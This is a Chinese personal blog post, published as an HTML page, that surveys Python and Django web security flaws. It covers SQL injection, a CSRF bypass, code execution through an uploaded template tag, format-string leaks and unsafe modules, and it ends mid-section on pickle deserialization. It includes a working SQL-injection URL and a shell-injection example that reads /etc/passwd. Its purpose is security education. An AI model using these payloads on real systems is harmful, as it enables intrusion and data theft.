@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>python-web-安全总结 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">python-web-安全总结</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 20, 2020&nbsp;&nbsp;17:08:18</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/python/">python</a>
+                            
+                        </span>
+						<span id="/2020/09/20/python-web-%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/" class="leancloud-visitors view" data-flag-title="python-web-安全总结">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><strong>xss</strong></p>
+<p>python下的xss其原理跟php是一样的，django近年的例子如下：</p>
+<p><strong>CVE-2017-12794</strong>,此例中通过抛出异常造成xss。</p>
+<p><strong>sql注入</strong></p>
+<p>一般来说使用django自带的操作数据库api是不会造成sql注入的,如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person.objects.filter(first_name&#x3D;request.GET.get(&#39;user&#39;))</span><br></pre></td></tr></table></figure>
+
+<p>不过django依然支持原生sql语法的使用方法,如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def index(request, *args, **kwargs):</span><br><span class="line">    for e in Person.objects.raw(&#39;select * from FIRST_Person &#39;):</span><br><span class="line">        print(e.first_name,e.last_name)</span><br><span class="line">    return render(request, &#39;home.html&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>控制台结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asd sdf</span><br><span class="line">mapl0 ppp</span><br><span class="line">admin hahaha</span><br></pre></td></tr></table></figure>
+
+<p>如果代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def index(request, *args, **kwargs):</span><br><span class="line">    for e in Person.objects.raw(&#39;select * from FIRST_Person WHERE first_name &#x3D; &#39; + &#39;&quot;&#39; + request.GET.get(&#39;user&#39;) + &#39;&quot;&#39;):</span><br><span class="line">        print(e.last_name)</span><br><span class="line">    return render(request, &#39;home.html&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>访问<strong><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/?user=admin">http://127.0.0.1:8000/?user=admin</a></strong>后控制台返回hahaha</p>
+<p>而访问<strong><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/?user=qqq%22%20or%20%221">http://127.0.0.1:8000/?user=qqq%22%20or%20%221</a></strong>，控制台直接返回了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sdf</span><br><span class="line">ppp</span><br><span class="line">hahaha</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码/命令执行</strong></p>
+<p>除内建的模块，还有<strong>os,commands,subprocess,multiprocessing,pty，Cpickle/pickle，PyYAML</strong>等模块能代码/命令执行，详细可看下文。</p>
+<p><strong>CSRF</strong></p>
+<p>django这类的框架<strong>自带csrf防护</strong>，不过在去年依然爆出csrf漏洞<a target="_blank" rel="noopener" href="http://blog.knownsec.com/2016/10/django-csrf-bypass_cve-2016-7401/"><strong>CVE-2016-7401-Django</strong></a>（知道创宇这篇分析很细致），如果django使用了Google Analytics则可能绕过django自带的csrf防护机制。</p>
+<p>Django对于CSRF的防护就是<strong>判断cookie中的csrftoken和提交的csrfmiddlewaretoken</strong>的值是否相等，但是<strong>Google Analytics可以通过referer帮我们设置用户的cookie</strong>，cookie一般如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utmz&#x3D;123456.123456789.11.2.utmcsr&#x3D;[HOST]|utmccn&#x3D;(referral)|utmcmd&#x3D;referral|utmcct&#x3D;[PATH]</span><br></pre></td></tr></table></figure>
+
+<p>其中[HOST]和[PATH]是由Referer确定的，也就是说当</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;x.com&#x2F;helloworld</span><br></pre></td></tr></table></figure>
+
+<p>时，cookie如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z&#x3D;123456.123456789.11.2.utmcsr&#x3D;x.com|utmccn&#x3D;(referral)|utmcmd&#x3D;referral|utmcct&#x3D;helloworld</span><br></pre></td></tr></table></figure>
+
+<p>django在当时的版本有cookie解析漏洞，当Cookie.SimpleCookie()解析a=hello]b=world这样的字符串时，就会取得a=hello和b=world，所以当Referer为<a target="_blank" rel="noopener" href="http://x.com/hello]csrftoken=world%EF%BC%8Ccsrftoken%E5%B0%B1%E8%A2%AB%E6%88%90%E5%8A%9F%E8%B5%8B%E5%80%BC%E3%80%82">http://x.com/hello]csrftoken=world，csrftoken就被成功赋值。</a></p>
+<p>详细的<a target="_blank" rel="noopener" href="http://blog.knownsec.com/2016/10/django-csrf-bypass_cve-2016-7401/"><strong>代码分析</strong></a>，值得一看。</p>
+<p><strong>文件上传</strong></p>
+<p>在php环境下如果不限制上传文件后缀会导致getshell，但在django下，如果上传的文件能覆盖类似url.py，<strong>init</strong>.py的文件，攻击者能顺利getshell。参考<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/36220.html">https://www.secpulse.com/archives/36220.html</a> 。还有django只有在development server的模式下才会修改了文件就立刻重启，否则修改了文件也暂时无法生效。</p>
+<p>当然除此之外还有其他方法，例如写cron（前提是有权限），和模板文件。</p>
+<p>简单说一下写模板文件的过程：</p>
+<p>需要在templatetags和templates分别写入一个文件（可能也不叫templatetags，可自行定义），templatetags文件夹内存放自定义标签，上传文件rce.py，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django import template</span><br><span class="line">import os</span><br><span class="line">register &#x3D; template.Library()</span><br><span class="line">@register.simple_tag</span><br><span class="line">def some_function(value):</span><br><span class="line">    shell &#x3D; os.system(&#39;touch mapl0&#39;)</span><br><span class="line">    return shell</span><br></pre></td></tr></table></figure>
+
+<p>templates文件夹存放静态html文件，上传文件home.html如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&#123;% load rce %&#125;</span><br><span class="line">&#123;% some_function &quot;%s&quot; as func %&#125;</span><br><span class="line">&lt;p&gt; command is &#123;&#123; func &#125;&#125; &lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在view里，index会使用这个模板：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def index(request, *args, **kwargs):</span><br><span class="line">    return render(request, &#39;home.html&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>访问后，就在项目目录生成了mapl0文件。</p>
+<p>可见使用限制很大，还需要一定的权限。首先，文件后缀没有限制，其次上传路径没有限制，templatetags目录已知，另外还需要有view使用这个模板。</p>
+<p>另外xml和html文件的自由上传依然可以造成xxe和xss。</p>
+<p><strong>文件包含</strong></p>
+<p><a target="_blank" rel="noopener" href="http://bobao.360.cn/news/detail/1475.html">案例</a></p>
+<p>相比之下文件包含比php少得多</p>
+<p><strong>重定向</strong></p>
+<p>django在今年爆出了两个重定向漏洞<a target="_blank" rel="noopener" href="https://paper.seebug.org/274/">CVE-2017-7233&amp;7234</a>其中的CVE-2017-7233与urlparse有关，漏洞的说明可查看下文。</p>
+<p><strong>不安全模块及函数</strong></p>
+<p><strong>内建函数</strong></p>
+<p><strong>input():</strong></p>
+<p>python input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入,在python3.0以后的版本中取消raw_input,并用input代替.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">value &#x3D; input(&quot;hello &quot;)</span><br><span class="line">print(&quot;welcome %s&quot; % (value,))</span><br></pre></td></tr></table></figure>
+
+<p>python2命令行下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello dir()</span><br><span class="line">welcome [&#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__name__&#39;, &#39;__package__&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>python3命令行下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello dir()</span><br><span class="line">welcome dir()</span><br></pre></td></tr></table></figure>
+
+<p><strong>assert():</strong></p>
+<p>assert断言是声明其布尔值必须为真的判定，如果发生异常就说明表达示为假。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;Users&#x2F;mapl0&#x2F;Desktop&#x2F;资料&#x2F;sec.py&quot;, line 3, in &lt;module&gt;</span><br><span class="line">    assert os.system(&#39;touch test&#39;)</span><br><span class="line">AssertionError</span><br></pre></td></tr></table></figure>
+
+<p>报了个错误，但test文件已被建立</p>
+<p><strong>代码执行函数</strong></p>
+<p>eval:计算字符串中的表达式</p>
+<p>exec:执行字符串中的语句</p>
+<p>execfile:用来执行一个文件#python3中已无此函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; &quot;print(&#39;eval:hello&#39;)&quot;</span><br><span class="line">b &#x3D; &quot;print(&#39;exec:hello&#39;)&quot;</span><br><span class="line">eval(a)</span><br><span class="line">exec(b)</span><br></pre></td></tr></table></figure>
+
+<p>python2和python3下结果一样</p>
+<p>eval:hello</p>
+<p>exec:hello</p>
+<p>execfile(‘temp.bin’)#temp.bin内容为print(‘execfile:hello’)</p>
+<p>结果</p>
+<p>execfile:hello</p>
+<p><strong>os模块:</strong></p>
+<p>os.system</p>
+<p>os.popen#和os.system的区别在于popen会把命令的输出作为返回值</p>
+<p>os.spawn</p>
+<p><a target="_blank" rel="noopener" href="http://wangyongbin.blog.51cto.com/8964308/1672725">os.exec家族</a></p>
+<p><strong>commands模块 :</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commands.getstatusoutput</span><br></pre></td></tr></table></figure>
+
+<p><strong>subprocess模块 :</strong></p>
+<p>subprocess.Popen</p>
+<p>subprocess.call通过子进程进行外壳注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from subprocess import call</span><br><span class="line">unvalidated_input &#x3D; &#39;&#x2F;bin&#x2F;true&#39;#true命令啥都不做,只设置退出码为0</span><br><span class="line">unvalidated_input +&#x3D; &#39;; cut -d: -f1 &#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">call(unvalidated_input, shell&#x3D;True)#当shell&#x3D;true时，shell命令可被当做多句执行。</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<p>​    nobody</p>
+<p>​    root</p>
+<p>​    ……..</p>
+<p>multiprocessing多进程模块 :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">p &#x3D; multiprocessing.Process(target&#x3D;print, args&#x3D;(&quot;hello&quot;))#target参数为函数名，args为函数所需参数</span><br><span class="line">p.start()</span><br><span class="line">p.join()</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<p>h e l l o</p>
+<p><strong>pty :</strong></p>
+<p>只能在linuxmac下使用的<strong>伪终端</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import pty</span><br><span class="line">pty.spawn(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>在python23下均可执行命令</p>
+<p>其他有安全问题模块及函数</p>
+<p><strong>codecs :</strong></p>
+<p>codecs作用于各种编码之间的相互转换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">import io</span><br><span class="line">b &#x3D; b&#39;x41xF5x42x43xF4&#39;</span><br><span class="line">print(&quot;Correct-String %r&quot;) % ((repr(b.decode(&#39;utf8&#39;, &#39;replace&#39;))))</span><br><span class="line">with open(&#39;temp.bin&#39;, &#39;wb&#39;) as fout:</span><br><span class="line">    fout.write(b)</span><br><span class="line">with codecs.open(&#39;temp.bin&#39;, encoding&#x3D;&#39;utf8&#39;, errors&#x3D;&#39;replace&#39;) as fin:</span><br><span class="line">    print(&quot;CODECS-String %r&quot;) % (repr(fin.read()))</span><br><span class="line">with io.open(&#39;temp.bin&#39;, &#39;rt&#39;, encoding&#x3D;&#39;utf8&#39;, errors&#x3D;&#39;replace&#39;) as fin:</span><br><span class="line">    print(&quot;IO-String %r&quot;) % (repr(fin.read()))</span><br></pre></td></tr></table></figure>
+
+<p>当b以二进制方式写入文件后，用codecs在进行读取，如果errors=’replace’且编码形式为utf-8时，则对于xF5和xF4这类不能编码的都会被替换为ufffd。</p>
+<p>在python2下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Correct-String &quot;u&#39;A\ufffdBC\ufffd&#39;&quot;</span><br><span class="line">CODECS-String &quot;u&#39;A\ufffdBC&#39;&quot;</span><br><span class="line">IO-String &quot;u&#39;A\ufffdBC\ufffd&#39;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在Python3下会报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Correct-String %r&quot;) % ((repr(b.decode(&#39;utf8&#39;, &#39;replace&#39;))))</span><br><span class="line">TypeError: unsupported operand type(s) for %: &#39;NoneType&#39; and &#39;str&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>ctypes :</strong></p>
+<p>ctypes是一个<strong>提供和C语言兼容的数据类型的外部库</strong>，当出现x00的空字符就会出现截断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">buffer &#x3D; ctypes.create_string_buffer(8)</span><br><span class="line">buffer.value&#x3D;&#39;abx00c1234&#39;</span><br><span class="line">print(buffer.value)</span><br><span class="line">print (buffer.raw)</span><br></pre></td></tr></table></figure>
+
+<p>在python2命令行下:</p>
+<p>​    ab</p>
+<p>​    abc1234</p>
+<p>在python3下回报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buffer.value&#x3D;&#39;abx00c1234&#39;</span><br><span class="line">TypeError: bytes expected instead of str instance</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python Interpreter :</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!python</span><br><span class="line">try:</span><br><span class="line">    if 0:</span><br><span class="line">        yield 5</span><br><span class="line">    print(&quot;T1-FAIL&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;T1-PASS&quot;)</span><br><span class="line">    pass</span><br><span class="line">try:</span><br><span class="line">    if False:</span><br><span class="line">        yield 5</span><br><span class="line">    print(&quot;T2-FAIL&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(repr(e))</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
+
+<p>对于类似if 0: if False: 的写法，python版本的不同，其测试结果也不同</p>
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t012589bb06bdd991b8.png"><img src="https://p1.ssl.qhimg.com/t012589bb06bdd991b8.png" alt="img"></a></p>
+<p>可重用整数 :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">999+1 is 1000 #False</span><br><span class="line">1+1 is 2 #True</span><br></pre></td></tr></table></figure>
+
+<p>对此的解释是，Python 维护了一个对象连接池，其中保有前几百个整数，重用它们会节约内存和对象的创建。</p>
+<p>浮点数比较 :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.2 * 3.0 &#x3D;&#x3D; 3.3 * 2.0 #False</span><br></pre></td></tr></table></figure>
+
+<p>由于固有受限精度，以及十进制与二进制小数表示所产生的差异导致的舍入错误。</p>
+<p>无穷大 :</p>
+<p>python支持无穷大的概念，但在python2下出现了这样的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">10**1000000 &gt; float(&#39;infinity&#39;)</span><br><span class="line">False</span><br><span class="line">float &gt; float(&#39;infinity&#39;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
+
+<p>python3下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 10**1000000 &gt; float(&#39;infinity&#39;)</span><br><span class="line">False</span><br><span class="line"> float &gt; float(&#39;infinity&#39;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: unorderable types: type() &gt; float()</span><br></pre></td></tr></table></figure>
+
+<p><strong>builtins :</strong></p>
+<p>此模块在python启动后首先加载到内存，此时还没有执行任何程序员写的代码，在Python2.X版本中，内建模块被命名为__builtin__，而到了Python3.X版本中更名为builtins。</p>
+<p>在 Python 2中， 内置对象可以通过魔法 <strong>builtins</strong> 模块进行访问。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.False, __builtins__.True &#x3D; True, False</span><br><span class="line"> True</span><br><span class="line"> False</span><br><span class="line"> int(True)</span><br><span class="line"> 0</span><br></pre></td></tr></table></figure>
+
+<p>false被赋值成true，true被赋值成false</p>
+<p><strong>urllib2:</strong></p>
+<p>Python 的 urllib 库曾出过一个头注入的漏洞，<a target="_blank" rel="noopener" href="http://blog.neargle.com/SecNewsBak/drops/Python%20urllib%20HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">CVE-2016-5699</a></p>
+<p>如果请求头里出现了**%0A**则直接换行导致攻击者可以注入额外http头和请求方法，可在ssrf里攻击redis或者memcached。</p>
+<p>Python2/Python3较新的版本均在出口处的putheader()函数里添加了一个检验，发现不合法URL会报一个error.</p>
+<p><strong>tarfile/ZipFile:</strong></p>
+<p>tarfile模块可以读取和写入tar文件，包括使用gzip或bz2压缩的压缩文件。</p>
+<p>ZipFile模块提供了创建，读取，写入，附加和列出ZIP文件的函数。</p>
+<p>TarFile.extractall使用此函数提取文件时，文件可能创建在其他路径，官方建议不要从不信任的来源提取文件。</p>
+<p>ZipFile.extractall也有同样的问题，解压时文件可能创建在其他路径，但在2.7.4版本中，模块会试图阻止这种行为。</p>
+<p><strong>urlparse :</strong></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/274/">CVE-2017-7233</a> urllib.parse.urlparse的特殊情况曾给django造成一个url跳转漏洞。</p>
+<p>django的<strong>is_safe_ur</strong>l函数可用于检测url是或否安全，但整合各函数是基于urllib.parse.urlparse的，urlparse在当scheme不等于http，path为纯数字时不能正常分割使得is_safe_url为true，从而达到bypass的目的。</p>
+<p>例如 https:1029415385，is_safe_url会直接判断为true。</p>
+<p><strong>格式化字符串漏洞:</strong></p>
+<p>起因是python的新方法format，示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class mapl0:</span><br><span class="line">    user &#x3D; &#39;mapl0&#39;</span><br><span class="line">    password &#x3D; &#39;hahaha&#39;</span><br><span class="line">    key &#x3D; &#39;123456&#39;</span><br><span class="line">print(&quot;This is &#123;user.user&#125; &#123;user.password&#125;&quot;.format(user &#x3D; mapl0))</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过format将mapl0类中的属性输出出来，在这篇<a target="_blank" rel="noopener" href="https://paper.seebug.org/175/">paper</a>中(@phithon)就有类似的情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    user &#x3D; get_object_or_404(User, pk&#x3D;request.GET.get(&#39;uid&#39;))</span><br><span class="line">    template &#x3D; &#39;This is &#123;user&#125;&#39;s email: &#39; + request.GET.get(&#39;email&#39;)</span><br><span class="line">    return HttpResponse(template.format(user&#x3D;user))</span><br></pre></td></tr></table></figure>
+
+<p>由于request.GET.get(‘email’)也就是用户通过get传入的email参数完全可控，我们就能让request.user里的任意属性输出出来，例如{user.password}。</p>
+<p>通过debug查看了一下request.user里的内容,其中session_key,目录，secret_key等等敏感信息都能查看，其中SECRET_KEY如果泄露，则可能配合django反序列化漏洞实现rce。</p>
+<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t0156734683638758a4.png"><img src="https://p3.ssl.qhimg.com/t0156734683638758a4.png" alt="img"></a></p>
+<p>Jinja的沙盒绕过与此同理。顺便一说，在<a target="_blank" rel="noopener" href="https://paper.seebug.org/175/">paper</a>还提到的f修饰符很有意思，在python3.6版本会后，被f/F修饰的字符串将会被当做代码执行。</p>
+<p><strong>反序列化</strong></p>
+<p><strong>Cpickle/pickle 反序列化：</strong></p>
